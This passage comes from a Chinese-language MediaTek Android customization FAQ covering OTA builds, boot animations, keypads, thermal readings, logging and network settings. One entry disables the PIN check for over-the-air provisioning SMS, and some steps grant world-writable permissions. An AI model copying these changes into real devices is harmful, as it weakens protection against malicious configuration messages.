    mtk_wdt_restart(WK_WDT_LOC_TYPE_NOLOCK);
    mtk_wdt_restart(WK_WDT_EXT_TYPE_NOLOCK);
}
 
然后在需要kick watchdog的地方调用mtk_kick_wdt()函数即可。如下：
void some_function() {
    //some stuffs
    ........
    //kick wachdog
    mtk_kick_wdt()
    //other stuff
}
```

## [性能]  [FAQ09974]  在某些平台下，包含循环的代码使系统变慢的原因是什么?怎么解决?

```text
由于我司某些平台下DVM内部机制的原因，遇到循环体中不包括函数调用，且会长时间处于循环体的循环算法时就会导致该线程抢占较多CPU从而导致系统变慢。
例如：
while(flag) {
    ;
}

此处的用意是等待另外一个线程改变flag的值，只有flag被设置为false时，代码才会向下执行，但是如果另外一线程迟迟不能改变flag的值就会引起系统变慢的情况。因此应当避免此种情况发生。
因此，解决此问题的方法想办法在循环体中存在函数调用的代码。例如在循环体中调用oject.wait在另外一个地方调用notify等。但是不可以调用一个函数体为空的函数。
```

## [init]  [FAQ10297]  预置开机执行Iptables命令

```text
修改方法如下：
1，新建一个文件脚本文件oem-iptables-init.sh，在这个文件里添加想要预置的命令。
2，adb push oem-iptables-init.sh system/bin/
3，将oem-iptables-init.sh赋予可执行权限，chmod 777 oem-iptables-init.sh

PS: 此方法用于带root 权限的手机，执行adb 命令之前先执行adb remount
```

## [性能]  [FAQ10366]  如何抓取View Hierarchy for UI Automator?

```text
在遇到界面显示异常等问题的时候，需要排查界面异常是由哪个处理过程所引起的，画面显示的过程，大致上可以分为：
1、上层app定义view 大小、位置，和画面对应的layout；
2、View system处理view的这些属性，计算view tree的大小、位置、处理view的绘制逻辑；
3、native framework处理绘图指令，未开启硬件加速绘制时，是使用Skia图形库来执行绘图指令；如果开启了硬件加速，则是GPU来执行绘图指令

当前这个FAQ就是要提供方法来抓取View hierarchy，排查第1、2这两个步骤是否出现问题

[SOLUTION] 
抓取方法是：
1、将手机用usb连接至电脑，确保手机软件版本是eng load，或者userdebug load，才可以抓View hierarchy，如果是user load，且没有打开对应的debug权限，则不可以抓；
2、打开Android sdk提供的Android Debug Monitor工具或Eclipse，进入DDMS这个视图界面；
3、打开Devices显示界面，在Devices的进程列表上方的那一排button中，找到最右边的button，将鼠标悬浮在button上方，显示的文字是"Dump View Hierarchy for UI Automator"；
4、在复现了画面显示异常的界面，保持画面不动，点击第3步中的那个button开始dump，完了之后系统会自动打开所dump到的文件，文件名是dump_xxx.uix，xxx通常是一串数字；
5、将鼠标移到文件名上，会悬浮显示出此文件的存放 folder 名称及路径，folder 命名格式为: uiautomatorviewer_xxxxx，xxxxx也是一串数字，将此folder打包提供给我们分析即可；
如果是自己分析该文件，那么直接在已经打开了的文件中，查看异常位置处的view的状态和属性是否正确即可，将鼠标移动到view的位置时，view会被红色虚线框highlight出来，右边的属性列表中会显示出该view的各项属性。
```

## [ota]  [FAQ10738]  Build otapackage后system.img没有打包进去

```text
在进行OTA全包生成时，生成的包才5M（编译过程是先new ，后再执行otapackage），经过对比，OTA包中缺少文件system.img和SEC_VER.txt文件.

[SOLUTION] 

Ota包里面缺失system img，原因是客户修改了prop里面的“ro.product.device” value值.
尝试以下两种方式，ota_from_target_files中不需要设定 cust_dir1 这个值了：
1. 修改ota_from_target_files 中的system_path：
system_path = os.path.join("out/target/product/g32wh_xfy","system.img")

2. 將 system.img copy 一份到不需要 device 相关的路径，比如out/target 下，那么在此处设置system_path值如下：
system_path = os.path.join("out/target", "system.img")
```

## [ota]  [FAQ03747]  差分包升级时签章问题

```text
原因：A版使用的key和B版使用的key不一致，导致签章error。
解决：先确定在ProjectConfig.mk文件中的宏：MTK_SIGNATURE_CUSTOMIZATION设置，
如果设置为yes， 客户需要自己去gen releasekey，生成key的文档参考DMS如下路径的资料：
/Product Line/WCX/3G Phone Data/Smart Phone/Software_Customer/Standard Package/MT6575 SW Doc Package/Build/V2.3 /Application Signing Process Enhancement.ppt ，
产生releasekey之后（releasekey在：alps/build/target/product/security/project下），
Build第一个版本，build A new， build A otapackage, 将A版download到手机上，再build第二版，build B new， build Botapackage。最后用命令
./build/tools/releasetools/ota_from_target_files –k alps/build/target/product/security/project/release –n –i oldotapackage.zip newotapackage.zip update.zip.
如果宏MTK_SIGNATURE_CUSTOMIZATION设置为no，则不需要产生key，使用默认的alps/build/target/product/security下的testkey。这时在build 完A、B两个版本后直接用命令：
./build/tools/releasetools/ota_from_target_files –n –i oldotapackage.zip newotapackage.zip update.zip.来制作差分包
```

## [ota]  [FAQ08907]  How to make OTA.zip for SDcard Upgrade

```text
1. Enable SystemUpdate:  EngineerMode--->Others--->System update options--->Sd card Update
2. Build : makeMtk [project]  new
     makeMtk [project]  otapackages
     Full package:[project] -ota-eng.[username] .zip ,rename as updat.zip;
 or delta package, please use command : build/tools/releasetools/ota_from_target_files -n -i old.zip new.zip update.zip
3. META-INF(/com/google/andriod/updater-script) (from full package)
scatter.txt:partition layout information(from full package)
type.txt: type of update package(from full package)
config.xml:(configure follow info by yourself ,please preference build.prop)
4. 将以上文件 files (update.zip, META-INF, scatter.txt, type.txt, configure.xml) 打包为 **.zip
5. copy **.zip to SD card , entry setting--->system update
 
config.xml info:
– Build number: The build number of the new version
– Language: The default language of the new version
– Oem: The oem of the new version
– Operator: The operator of the new version
– Product: The product of the new version
– Publish time: When the new version is published
– Version name: The version of the new version
– Android number: The version of Android (e.g. Android 4.2)
– Flavor:
– Notes: What’s new in the package, shown to users
```

## [ota]  [FAQ08071]  Build OTA升级包的时候出现异常,无法编译

```text
在Build otapackage时，出现以下build error：
Build error:
ERROR: signapk.jar failed: return code 1
make[2] : *** [out/target/product/s9201/s9201-ota-55.zip]  Error 1
make[2] : *** Deleting file `out/target/product/s9201/s9201-ota-55.zip’

[SOLUTION] 
解决：从log分析，是low memory 导致build otapackage 失败的：
需确定build otapackage时保证足够的memory，比较多的情况下在制作升级包时，都是采
用虚拟机的方式，而不是特定义的一台server，所以就会有low memory 的情况。如果可以，
增加此虚拟机的memory 也行
参考以下两种方案：
1. 将 partition_table_MT6589.xls中的android那个区域的大小改小一些, 删除一些内置在system区域的apk；（cause：对于build otapackage 失败，是在打包ota时，对ota进行签章时报了low memory的error。对于签章sign所需的memory的大小，取决于apk的大小，所以对partition_table_MT6589.xls 中的android 分区设定，如果android 分区设定大，则在对ota中的apk进行签章时要求的memory也要大。）

2. 修改SignFile.java 中的cmd = [“java”, “-Xmx2048m”, “-jar”, 这条 ，将“-Xmx2048m”，修改 为“-Xmx4096m” 或者更大，也可。（cause：对于这个SignFile 中的这个cmd，是指当前签章run 的虚拟机上，指定虚拟机可用的最大heap size为2048，这个值需要参考当前的build的pc server的可用内存的大小。
```

## [boot]  [FAQ03873]  如何实现通过工程指令切换开关机动画铃声的功能?

```text
通过工程指令切换开关机动画铃声的功能；
输入正确的指令(例如：*#123890#)后，返回home界面，即完成两套开关机动画铃声的切换动作。
[SOLUTION] 
一、修改文件 /mediatek/config/${Project}/init.rc
在文件的末尾添加：
# Change the bootanimation and bootaudio
on property:persist.radio.change.bootanim=1
    user root
    group root
    write /proc/bootprof "INIT:NAND:Mount_START"
    # Mount /system rw first to give the filesystem a chance to save a checkpoint
    mount yaffs2 mtd@system /system nandboot
    chmod 0777 /system/media
    copy /system/bootanim/bootanimation.zip /system/media/bootanimation.zip
    copy /system/bootanim/bootaudio.mp3 /system/media/bootaudio.mp3
    copy /system/bootanim/shutanimation.zip /system/media/shutanimation.zip
    copy /system/bootanim/shutaudio.mp3 /system/media/shutaudio.mp3
    setprop persist.radio.change.bootanim 0
    mount yaffs2 mtd@system /system ro remount nandboot
    write /proc/bootprof "INIT:NAND:Mount_END"

二、修改文件
packages/apps/Contacts/src/com/android/contacts/SpecialCharSequenceMgr.java
添加 Code:
//设置处理更换开关机动画和铃声的命令
private static final String CHANGE_BOOTANIM = "*#123890#"; 
修改 Code:
static boolean handleChars(Context context, String input, boolean useSystemWindow, EditText textField) {
    Log.d(TAG, "handleChars() dialString:" + input);
    //get rid of the separators so that the string gets parsed correctly
    String dialString = PhoneNumberUtils.stripSeparators(input);
    if (handleIMEIDisplay(context, dialString, useSystemWindow)
        || handlePinEntry(context, dialString)
        || handleAdnEntry(context, dialString, textField)
        || handleSecretCode(context, dialString)
        || handleChangeBootanim(context, dialString)) {
            //此处添加处理更换开关机动画和铃声的 Code
        return true;
    }
    return false;
}

添加函数：
static boolean handleChangeBootanim(Context context, String input) {
   if (input.equals(CHANGE_BOOTANIM)) {
        Intent it = new Intent();
        it.setAction("persist.radio.change.bootanim");
        context.sendBroadcast(it);
        Intent intent = new Intent("android.intent.action.MAIN");
        intent.addCategory(Intent.CATEGORY_HOME);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
        return true; 
    }
    return false;
}

三、创建一个 APK，这个 APK 的 android:sharedUserId="android.uid.phone"，并签上系统签名；
这个 APK 里面只有一个 BroadCastReceiver，onReceive 函数里面的内容是：
if(intent.getAction().equals("persist.radio.change.bootanim")){
    android.os.SystemProperties.set("persist.radio.change.bootanim", "1");
}
AndroidManifest.xml 里面内容如下：
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.change.bootanim"
    android:versionCode="1"
    android:versionName="1.0"
    android:sharedUserId="android.uid.phone">
    <uses-sdk android:minSdkVersion="10" />
    <application
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name" >
        <receiver
            android:label="@string/app_name"
            android:name=".ChangeBootanimReceiver" >
            <intent-filter >
                <action android:name="persist.radio.change.bootanim"/>
                <category android:name="android.intent.category.DEFAULT"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>

四、请贵司在如下目录下直接创建 bootanim
/vendor/mediatek/${Project}/artifacts/out/target/product/${Project}/system/
然后将 bootanimation.zip、bootaudio.mp3、shutanimation.zip 和 shutaudio.mp3  拷贝到该目录下，然后重新编译工程即可。
```

## [key]  [FAQ11318]  要增加實體home key，硬件/軟件該如何修改

```text
有兩種解法
1. 硬件: 拉到keypad module的COL*/ROW*
軟件: 設定codegen.dws裡面的KEYPAD Setting，將相對的COL*/ROW*設定成"HOME"，GPIO or GPIO_EXT Setting使用到的GPIO pin要設定成COL*/ROW*
2. 硬件: 拉到PMIC的HOMEKEY
軟件: 設定codegen.dws裡面的KEYPAD Setting，將沒有在用的COL*/ROW*設定成"HOME"，且修改下列的define
alps/mediatek/custom/$Project_Name/kernel/kpd/kpd/mtk_kpd.h
#define KPD_PMIC_RSTKEY_MAP KEY_HOME
```

## [boot]  [FAQ11401]  手机中不能播放关机动画和铃声?

```text
1.确认手机中有关机资源.可先Check下out目录是否有关机动画包(比如system/media目录下的shutanimation.zip)
2.修改alps\frameworks\base\services\java\com\android\server\power\shutdownThread.java的beginShutdownSequence作如下的修改：
private static void beginShutdownSequence(Context context) {
    ……
    if (cust != null) {
        if (cust.equals("CUST")) {
            mShutOffAnimation = true;
        }
    }
    // MTK add for play shutdown animation
    mShutOffAnimation = true;  //增加这行代码，
    ……
}

3.重新编译frameworks/base/services/java,然后将更新后的services.jar push进手机的system/framework中再测试.
```

## [clock]  [FAQ11375]  系统时间为12小时制，进入记事本保存一条记录，记录时间以24小时制显示

```text
系统时间为12小时制，进入记事本保存一条记录，记录时间以24小时制显示
[SOLUTION] 
该信息显示为24小时制是design 的行为，如果贵司想要修改可以参考以下信息。
1.format格式的资源  如，values/string.xml
    <string name="done_time_format">Done at %Y-%m-%d %H:%M</string>
2. timeFormat的地方在Utils.java, 可以自行修改timeFormat。
public static String getDateText(Context context, long dateMillis, int type) {
    ...
    else if (type == DATE_TYPE_COMPLETE) { // get complete date
        if (dateMillis <= 0) {
            return null;
        }
        timeFormat = context.getResources().getString(R.string.done_time_format);
    }
    ...
}
```

## [bt]  [FAQ11468]  如何在KK版本上支持蓝牙发送APK文件

```text
将application/vnd.android.package-archive类型加到packages/apps/Bluetooth/AndroidManifest.xml文件中。如：
1. <activity android:name=".opp.BluetoothOppLauncherActivity"
            android:process="@string/process"
            android:theme="@android:style/Theme.Translucent.NoTitleBar"
            android:label="@string/bt_share_picker_label"
            android:enabled="@bool/profile_supported_opp">
            <intent-filter>
                <action android:name="android.intent.action.SEND" />
                <category android:name="android.intent.category.DEFAULT" />
                <data android:mimeType="image/*" />
...
+++          <data android:mimeType="application/vnd.android.package-archive" />
 
2. <intent-filter>
                <action android:name="android.intent.action.SEND_MULTIPLE" />
                <category android:name="android.intent.category.DEFAULT" />
                <data android:mimeType="image/*" />
...
+++          <data android:mimeType="application/vnd.android.package-archive" />
```

## [FM]  [FAQ10220]  如何修改factory mode下FM的默认测试频点及阀值

```text
Factory mode下测试FM会默认测试四个频点88.5、105.8、98.0、108.0的RSSI值，如果小于阀值-95db则测试fail，高于阀值-95db则测试pass。
本文将说明如何修改默认测试频点及阀值。
[SOLUTION] 
请修改alps/mediatek/custom/[project] /factory/factory.ini 以及 factory.chn.ini文件中的
FMRadio.CH1=885;
FMRadio.CH2=1058;
FMRadio.CH3=980;
FMRadio.CH4=1080;
```

## [battery]  [FAQ04601]  [Power/Thermal] 如何读取CPU温度?

```text
SW control path:
 
mediatek\platform\mt6577\kernel\core\mtk_ts_cpu.c

sysfs:
adb shell
cat  /sys/class/thermal/thermal_zone0/temp
 
各个thermal zone 对应的interface如下：
cat  /sys/class/thermal/thermal_zone0/temp
cat  /sys/class/thermal/thermal_zone1/temp 
cat  /sys/class/thermal/thermal_zone2/temp
......
您需要先透過type接口获知当前thermal_zone name, 以便于正确读取：
/sys/class/thermal/thermal_zone*/type

Notes:
1. PMIC 6329 HW 無法讀取thermal sensor溫度，回報給SW, 目前solution always 為100C(mt6320 支持)
2. ABB temp 與CPU temp 實驗測量結果溫度基本一致(相差不到0.1C), 因此Driver 基本类似。 
3. ADC3 是給3GPA RF IC 使用的, 读取的是external 摆放在IC 旁边的thermal sensor temperature
```

## [FAQ09755]  接收到配置短信，点安装，为什么有时候会显示要求输入Pin码，该如何解决?

```text
修改文件 OmacpMessageSettingsDetail.java
如下判断地方修改为
if (!sPinUnlock) {
    sPinUnlock = true;
    // write the database
    markMessageAsPinUnlock();
    //showDialog(DIALOG_UNLOCK_PIN);
    // return;
}
```

## [FAQ10351]  开机时怎样区分是long press reboot还是normal reboot?

```text
以72为例，在
mediatek\platform\mt6572\preloader\src\drivers\platform.c
platform_boot_status()这边可以添加如下判断
U32 just_rst;
pmic_read_interface(0x04A, &just_rst, 0x01, 4);
if(just_rst)
{
       // long press reboot
}
else
{
       //normal reboot
}
```

## [key]  [FAQ11678]  KK版本任意按鍵喚醒系統功能的配置

```text
目前版本上按键唤醒系统的功能默认是打电话状态下才有（除了powerkey），若要實現任意一個按鍵在系統深度睡眠後還可以喚醒，需要做一些修改，以home key為例，詳細如下：
 
[Solution] 
1.确认唤醒源均已包含了WAKE_SRC_KP
mediatek\platform\mt6589\kernel\core\ mt_spm_sleep.c
#define WAKE_SRC_FOR_SUSPEND \
(WAKE_SRC_KP | WAKE_SRC_EINT | WAKE_SRC_CCIF_MD2 | WAKE_SRC_CCIF_MD1 | \
WAKE_SRC_USB0_CD | WAKE_SRC_USB1_CD | WAKE_SRC_PWRAP | \
WAKE_SRC_SYSPWREQ | WAKE_SRC_MD_WDT)
#define WAKE_SRC_FOR_DPIDLE \
(WAKE_SRC_KP | WAKE_SRC_GPT | WAKE_SRC_EINT | WAKE_SRC_CCIF_MD2 | \
WAKE_SRC_CCIF_MD1 | WAKE_SRC_USB0_CD | WAKE_SRC_USB1_CD | \
WAKE_SRC_USB1_PDN | WAKE_SRC_USB0_PDN | WAKE_SRC_AFE | \
WAKE_SRC_PWRAP | WAKE_SRC_SYSPWREQ | WAKE_SRC_MD_WDT)
 
2. \mediatek\config\hedy89_we_jb2\mtk-kpd.kl
增加 key 102 HOME WAKE
 
3、\alps\mediatek\kernel\drivers\keypad\kpd.c：
註釋掉//#define MTK_KP_WAKESOURCE
 
4、Android Framework有屏蔽部分特殊按鍵，
在alps/frameworks/base/policy/src/com/android/internal/policy/impl下的PhoneWindowManager.java文件中isWakeKeyWhenScreenOff()看是否有對應的keycode（如例子homekey），若有，請刪除.
 
这样修改后待机电流會稍微增大,请知悉.
```

## [性能]  [lmk]  [FAQ10559]  如何更新LMK Low Memory Killer 的阈值

```text
Low Memory Killer 的阈值分成两个数组，一个是adj 数组，描述process 所对应的oom_adj，另外一个是minfree 数组，描述process 所对应的memory 的阈值。
上层可以直接通过读写: 
 /sys/module/lowmemorykiller/parameters/adj 
 /sys/module/lowmemorykiller/parameters/minfree
来进行调整.minfree 以KB 为单位

在JB 以后版本，AMS 起到后，将根据屏幕分辨率以及内存大小调整默认的LMK 的阈值，对应的具体的代码在：
frameworks/base/services/java/com/android/server/am/ProcessList.java#updateOomLevel 
可以修正这个updateOomLevel 来调整LMK 的这两个参数

注意, 从JB9.MP 后，LMK 自动将oom_adj 转换成 oom_score_adj ，即写入时依旧是按照oom_adj 写入，而读取出来时，则是oom_score_adj. 
if oom_adj = 15 then oom_score_adj = 1000;
else oom_score_adj = oom_adj * 1000/17;
简单的oom_adj 与oom_score_adj 的转换表格：
oom_adj  oom_score_adj
-16             -941
-12             -705
0                  0
1                 58
2                117
4                235
6                352
9                529
15              1000
```

## [boot]  [FAQ10755]  如何解决开机过程kernel logo到开机动画黑屏问题

```text
在开机过程，如果将bootanimation.zip的图片换成非黑色背景，发现从kernel logo到bootanimation之间会黑屏一下或者黑屏时间过长，这类问题的原因有可能是和Display相关，也有可能和Bootup流程相关。因此根据测试手法结果的不同，采用对应的解决办法，测试前，手如下对比实验：

1.将出现黑屏手机内部的system/media/bootanimation.zip pull到没有黑屏问题的手机，check是否还有黑屏，排除动画的问题
2.将正常手机的 system/media/bootanimation.zip pull到目前有黑屏问题的手机，check是否依然黑屏，排除动画的问题

在对比实验确定和bootanimation.zip无关，与手机本身行为有关的情况下，进行如下实验
一、去掉开机铃声，如果黑屏依然存在：
1. 如果目前Project所用的LCM Panel是Command Mode，只需要申请Patch：ALPS00932048，适用 ICS、JB2、JB3、JB5。
2. 如果目前Project所用的LCM Panel是Video Mode，先申请Patch：ALPS00932048，适用 ICS、JB2、JB3、JB5；
然后如果是72 Platform ，SW Version：JB3，请再申请Patch: ALPS00845248；如果是82 Platform ，SW Version：JB5，请再申请Patch: ALPS00902086；
如果问题依然无法解决，请提交eService进一步分析解决。（请先排除bootanimation.zip的影响）

二、去掉开机铃声后，没有黑屏
如果去掉开机铃声，从Kernel Logo到动画是没有黑屏，请先参照相关FAQ：[FAQ09563]  开机过程kernel logo到开机动画黑屏时间过长，如果问题依然无法解决，请提交eService进一步分析解决。
```

## [prop]  [FAQ10716]  system property 重启或者恢复出厂设置后无效(丢失)

```text
System Property 存读写上来说，存在两种特别的property.
第一种即是以ro. 开头的ro.xxxx.yyyy ，此类即称为只读的系统属性，即它只可设置一次。如果系统中已经存在，即无法再设置。
第二种即是以persist. 开头的persist.xxxx.yyyy , 此类称为持久化的系统属性，即设置一次后，将自动把结果保存在/data/property 当中，下次开机时会自动加载。

对于一般的system property 只是保存在init 的shared memory 当中, 不会更新disk 中的数据，一旦掉电即丢失; 对于以persist. 开头的持久化的系统属性，因为结果是保存在/data 分区，通常在恢复出厂设置时因为/data 分区被清掉，就也会丢失。针对此类，如果贵司一定要保存而不被清除，需要启用我司的Special Factory Mode, 将相关的文件保存下来。具体可以参考: Android SD upgrade application note.docx
 
[相关FAQ] 
FAQ07367: 如何设置system property 默认值
FAQ04349: 不能添加system property, 提示： permission denied uid:xxxxx  name:xxxxx
FAQ03994: system property 写入/更新后，马上读取无效问题
FAQ03778: 如何对system property 进行扩容
FAQ06739: system property 设置失败的可能性分析和初步诊断
FAQ03994: system property 写入/更新后，马上读取无效问题
```

## [CMD] df 等命令的源码位置

```text
system/core/toolbox/df.c
```

## [FAQ10818]  如何给所有画面增加一层水印(WaterMark)效果?

```text
1) 新建一个名为setup.conf的文件,写入以下内容:B79A939390%20
然后把这个conf文件push到手机的system/etc目录下
 
2) 以加水印字串“hello world,this is my mark”为例, 再修改:WaterMark.java(frameworks/base/services/java/com/android/server/wm)文件,
注释掉WaterMark构造函数中的这一句:

mText = builder.toString();
加上这一句:
mText = "xxx"  ,  xxx表示你想要加为水印的字符串

3) 重新编译生成services.jar文件并push到手机的system/framework下, reboot手机.

//给系统添加水印
https://blog.csdn.net/qq_28534581/article/details/86609839

//给图片添加时间水印
private Bitmap addTimeFlag(Bitmap src){
  // 获取原始图片与水印图片的宽与高  
    int w = src.getWidth();  
    int h = src.getHeight();  
    Bitmap newBitmap = Bitmap.createBitmap(w, h, Config.ARGB_8888);  
    Canvas mCanvas = new Canvas(newBitmap);  
    // 往位图中开始画入src原始图片  
    mCanvas.drawBitmap(src, 0, 0, null); 
    //添加文字
    Paint textPaint = new Paint();  
    SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");  
    String time = sdf.format(new Date(System.currentTimeMillis()));  
    textPaint.setColor(Color.RED) ;
    textPaint.setTextSize(100); 
    String familyName = "宋体";  
//        Typeface typeface = Typeface.create(familyName,  
//                Typeface.BOLD_ITALIC);  
//        textPaint.setTypeface(typeface);  
//        textPaint.setTextAlign(Align.CENTER);  
    
    mCanvas.drawText(time, (float)(w*1)/7, (float)(h*14)/15, textPaint); 
    mCanvas.save(Canvas.ALL_SAVE_FLAG);  
    mCanvas.restore();  
    return newBitmap ;
}
```

## [clock]  [FAQ04088]  如何配置NTP对时server?

```text
使用NTP方式对时时，由于需要与对时server进行交互，若对时server不work，就无法获取正确的时间，此时应替换为其他有效的server。
Server配置的地方为：
frameworks/base/core/res/values/Config.xml
<string translatable="false"name="config_ntpServer">cn.pool.ntp.org</string>
将“cn.pool.ntp.org”替换为其他server，如”asia.pool.ntp.org” 或“north-america.pool.ntp.org”等即可
```

## [ota]  [FAQ11015]  通过组合键进入recovery模式选择sdcard菜单升级，升级完如何自动重启?

```text
MTK默认设计：
将OTA升级包放入SD卡根目录下，按键进入recovery模式选择sdcard菜单升级，升级完成后无法自动重启，需要手动选择菜单完成重启；
客户若有需求实现自动重启，请问应该如何更改！

[SOLUTION] 
修改recovery.cpp文件prompt_and_wait函数如下两处位置添加：return；//add

1、ui->Print("\nInstall from sdcard complete.\n");
finish_recovery(NULL);
return; //add

2、ui->Print("\nInstall from sdcard2 complete.\n");
finish_recovery(NULL);
return; //add

3、按照如下方式快速编译recovery.img并重新download即可验证：

./makeMtk mm bootable/recovery/
./makeMtk -opt=ONE_SHOT_MAKEFILE=build/target/board/Android.mk r recoveryimage
```

## [apn]  [FAQ05276]  用错误的APN仍然能够上网的问题

```text
如果测试机用错误的apn能够上网，请先用对比机进行对比测试。因为有的是因为网络端能够接受这样错误的APN，所以能够上网。如果测试机和对比机行为一致，那么说明测试机是正常的，是网络端的问题，如果行为不一致请再提交eservice并提供相应的mobile log和modem log。
```

## [net]  [FAQ02986]  如何查看TCP/IP缓冲大小

```text
查看alps\mediatek\config\xxx(工程名)\Init.rc文件中，找到如下定义

# Define TCP buffer sizes for various networks

#   ReadMin, ReadInitial, ReadMax, WriteMin, WriteInitial, WriteMax,
setprop net.tcp.buffersize.default 4096,87380,110208,4096,16384,110208
setprop net.tcp.buffersize.wifi    4095,87380,110208,4096,16384,110208
setprop net.tcp.buffersize.umts    4094,87380,110208,4096,16384,110208
setprop net.tcp.buffersize.edge    4093,26280,35040,4096,16384,35040
setprop net.tcp.buffersize.gprs    4092,8760,11680,4096,8760,11680
```

## [net]  [FAQ02987]  : 如何增加一组DNS地址

```text
alps\mediatek\config\xxx(贵司工程名)\Init.rc
修改方法：
1：找到定义tcp buffer的地方，如下:
Define TCP buffer sizes for various networks

2：在后面加上
setprop net.dns1 8.8.8.8
```

## [net]  [FAQ02992]  : 如何通过AT命令发Textmode短信

```text
AT+CMGF=1 //设置短信为TEXT MODE ;
AT+CSCS="GSM" //设置短信编码方式为GSM-7bits
AT+CSMP=17,167,0,0 //设置短信编码格式
AT+CMGS="10086",129,"adc" // TEXT MODE下发短信

也可以不输入中间的number type，但是需要用逗号留空
AT+CMGS="10086",,"abc"

*注:
如果从PC 发AT设为 text mode ， modem 收发sms 就会变为text mode 了，而 AP 不支持text mode ，只支持pdu mode ，
所以会有sms 无法收发等异常, 如果PC 发AT 切到了text mode ，请记得要再发AT 切回PDU mode(AT+CMGF=0).
```

## [log]  [FAQ09564]  [log]  如何抓取开机Log

```text
一般分析开机失败或者开机过程异常问题，都牵涉到如何抓取开机log的问题，为了顺利抓取开机Log便于分析问题，参照如下抓取有效log：
1.如果开机过程还没有出现开机动画，就已经异常，直接抓取UART串口log；
2.如果开机动画已经显示，后面出现异常，可以首先check SD卡是否已经mount成功，如果SD卡mount成功，直接提供Mobilelog；否则，可以通过adb logcat抓取log或者通过我司release的GAT Tool抓取log，其中logcat抓取log的command：adb logcat -v time -b main -b events -b system>logcat.txt。
```

## [debug]  [FAQ04967]  [Android Debug]  如何抓取Java Backtrace

```text
1. 连接adb,使用ps命令查看需要抓的Java Application的PID。
2. adb下，执行kill -3 PID，系统会将backtrace生成在 data/anr/traces.txt，然后将这支文件pul出来即可。
为了方便，您可以将下面这部分保存成windows下面的bat脚本，双击执行后获取Java Backtrace。
-------------------------------------------------------------------------
adb remount
adb shell chmod 0777 data/anr
adb shell ps

@echo off
set processid=
set /p processid=Please Input process id:

@echo on
adb shell kill -3 %processid%

@echo off
ping -n 2 127.0.0.1>nul

@echo on
adb pull data/anr/traces.txt trace-%processid%.txt

pause
------------------------------------------------------------------------- 
```

## [ota]  [FAQ11106]  SECURE OTA 升级包里面缺少SEC_VER.txt导致升级失败

## [FAQ11601]  如何抓取系统memory使用状况

## [ota]  [FAQ11475]  升级报错"Error: System property does not match"怎么办?

```text
现象：
如果升级过程在recovery.log或者last_log发现如下出错error：
Error: System property does not match
检查点：
首先：检查下升级包中的build.prop和手机里面的是否一致? 获取手机里的build.prop方法：adb pull /system/build.prop  build.prop 升级包里的build.prop文件位于/system目录下。
其次；重点比对下ro.product.device和ro.build.product的value值，确保一致的前提下，看看是否value值包含多余的空格符及退格符、ro.product.device为空等。
如果还是解决不了问题，请提eservice给MTK，同时并把log及两份build.prop附上来。
```

## [FAQ11660]  关于KK上的chromium的几点说明

```text
KK上的browser, 对于chromium的几个问题：
1>  所有的 WebView 都使用 Chromium 解析渲染，是否是这样的?
是的。

2>  如何查看浏览器的渲染引擎?
WebSettings.getUserAgentString()或者访问 www.show-ip.net/browserinfo
可以取得WebView的default User Agent, 例如：
Mozilla/5.0 (Linux; Android 4.4.2; DeviceName Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36
代表是使用Chrome 30版的浏览器引擎，对应WebKit版本是537.36

3>  渲染引擎的职责是什么?
浏览器引擎主要的工作:
载入 -> 解析 -> 排版 -> 渲染 -> 显示， 还有执行网页的JavaScript等等。
```

## [bt]  [FAQ06811]  如何查看蓝牙固件版本

```text
一、通过log查看
可以通过kernel log看一下，搜索关键字“firmware”。
例如有如下一句：
(1)[117:mtk_wmtd]  [WMT-IC]  [I] mt6628_patch_dwn:the 1 time valid patch found: (/system/etc/firmware//mt6628_patch_e2_0_hdr.bin
可以看到bt是e2版本。

【注意】此log需要在在开机情况下任何wcn相关应用（包括BT、WIFI，FM，GPS）都没有打开的情况下，开启蓝牙才可以看到。

建议使用以下步骤：
1.清空全部log，设置开机自动抓取log选项，确保所有wcn相关应用已经关闭后关机。
2.重新开机，确认此时已经开始抓取log。
3.开启蓝牙。
4.关闭log，检查kernel log，搜索关键字“firmware”，检查蓝牙固件版本。

二、通过adb查看，命令如下所示：
=>cd adb
=>adb shell
=>cd /etc/firmware
=>ls

在etc/firmware下可能会看到好几个bin文件，请以带有“_0”、“_1”后缀的版本为基准。

举例如下:

etc/firmware路径下看到以下3个bin文件，
mt6628_patch_e1_hdr.bin
mt6628_patch_e2_0_hdr.bin
mt6628_patch_e2_1_hdr.bin
则bt最终版本就是e2。
```

## [FAQ10004]  在关机界面添加重启菜单功能

## [FAQ09429]  在开机向导中的语言选择界面切换语言，当前的语言选择界面没有更新到设定的语言，该如何解决?

## [FAQ09441]  mtk内置的apk及其用途总结

## [FAQ09759]  [Audio APP] 音乐播放器中显示歌曲的信息

## [FAQ08330]  在相机中拍照至空间满，删除部分图片后仍无法拍照

## [FAQ07553]  [Storage] 72平台Fat on nand功能实现

## [FAQ06920]  [VideoEditor] VideoEditor（电影工作室）支持导入/导出哪些格式

## [FAQ03654]  [FlashTool] How to customize download tool

## [FAQ04545]  【NvRAM】Native层读写nvram

## [FAQ03656]  How to process Modem Exception?

## [FAQ02494]  在关机界面添加重启功能

## [FAQ12222]  下载的文件名会为乱码

## [FAQ06648]  [Audio App] FileManager 中点击音乐文件设置为来电铃声

## [FAQ09996]  同一套代码实现不同的项目使用不同的客制化分区表

## [FAQ11577]  Linux 孤儿进程组问题说明

## [FAQ12988]  大量图片时Gallery打开图片速度很慢

## [FAQ13408]  AOSP编译常见问题

## [FAQ13642]  [Audio App] home界面点击fm图标后，fm不自动播放

## [FAQ13719]  [Audio App] FM菜单选项中添加手动设置频率

## [FAQ12170]  [sdcard-common] KK版本如何去掉内置T卡?

## [FAQ13908]  [keypad] 怎样实现单按PowerKey重启功能?

## [FAQ12958]  [Audio Profile] 如何在状态栏添加一个general和outdoor对应的图标

## [FAQ13474]  [Audio Profile] 如何让设置的通知音只播放前10秒

## [FAQ11130]  WAP PUSH参数介绍

## [FAQ09383]  [BMT]  如何设置长摁powerkey（或者powerkey+homekey）使得系统重启或者关机

## [FAQ08960]  [Others] 如何在工厂模式支持special factory reset功能，执行reset后可以清除测试痕迹并保留/data/app下预置apk?

